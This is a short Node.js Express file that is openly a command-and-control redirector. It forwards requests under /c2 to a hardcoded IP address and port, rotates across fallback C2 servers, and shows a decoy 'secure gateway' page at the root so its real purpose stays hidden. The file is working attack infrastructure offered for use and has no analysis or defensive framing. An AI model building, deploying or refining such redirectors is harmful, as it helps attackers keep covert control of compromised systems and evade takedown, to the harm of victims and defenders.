const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const helmet = require('helmet');

const app = express();
const PORT = process.env.PORT || 10000; // Default to Render's standard port if not specified

// List of target C2 URLs for dynamic selection (can be overridden by environment variable)
const TARGET_C2_URLS = process.env.TARGET_C2_URLS ? process.env.TARGET_C2_URLS.split(',') : [
  'http://31.57.147.77:6464'
  // Add more fallback URLs here if needed
];

// Function to select a target URL (simple rotation or random selection)
let currentTargetIndex = 0;
function getCurrentTargetUrl() {
  const targetUrl = TARGET_C2_URLS[currentTargetIndex];
  // Rotate to next target for the next request (simple round-robin)
  currentTargetIndex = (currentTargetIndex + 1) % TARGET_C2_URLS.length;
  return targetUrl;
}

// Use Helmet to add security headers
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      objectSrc: ["'none'"],
      upgradeInsecureRequests: []
    }
  }
}));

// Proxy middleware for all C2 endpoints (handles upload, download, etc.)
app.use('/c2', createProxyMiddleware({
  target: () => getCurrentTargetUrl(), // Dynamically select target URL
  changeOrigin: true,
  pathRewrite: {
    '^/c2': '' // Remove /c2 prefix when forwarding to target
  },
  onProxyReq: (proxyReq, req, res) => {
    // Detailed logging of incoming request
    console.log(`Incoming request: ${req.method} ${req.url}`);
    console.log(`Headers: ${JSON.stringify(req.headers, null, 2)}`);
    console.log(`Proxying to: ${proxyReq.getHeader('host')}${proxyReq.path}`);
  },
  onProxyRes: (proxyRes, req, res) => {
    // Log proxy response status and headers
    console.log(`Proxy response for ${req.url}: Status ${proxyRes.statusCode}`);
    console.log(`Response headers: ${JSON.stringify(proxyRes.headers, null, 2)}`);
  },
  onError: (err, req, res, target) => {
    console.error(`Proxy error with target ${target} for ${req.url}:`, err);
    res.status(503).send('Service Unavailable');
  }
}));

// Redirect root to a harmless page
app.get('/', (req, res) => {
  res.status(200).send('<h1>Welcome</h1><p>This is a secure gateway.</p>');
});

// Catch-all for other requests
app.all('*', (req, res) => {
  res.status(404).send('Not Found');
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`C2 Redirector running on port ${PORT}, proxying to dynamic targets: ${TARGET_C2_URLS.join(', ')}`);
});
